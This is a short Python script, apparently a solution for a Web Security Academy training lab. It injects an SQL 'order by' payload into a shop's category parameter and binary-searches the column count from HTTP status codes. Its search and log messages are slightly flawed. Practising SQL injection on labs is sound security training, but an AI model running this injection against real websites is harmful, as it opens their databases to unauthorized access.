import requests
from pwn import *
url = "https://ac141f861ea930df80a3036f00f10064.web-security-academy.net/filter?category=Accessories"
def get_cols_no(url, lo, hi):
    if hi - lo <= 1:
        log.success("Found {}".format(lo))
        return lo
    mid = (lo + hi) // 2
    new_url = url + '\' order by {}--'.format(mid)
    response = requests.get(new_url)
    if response.status_code != 200:
        log.failure("Trying {} cols: too high".format(mid))
        return get_cols_no(url, lo, mid - 1)
    else:
        log.failure("Trying {} cols: too low".format(mid))
        return get_cols_no(url, mid, hi)

if __name__ == '__main__':
    col_no = get_cols_no(url, 1, 10)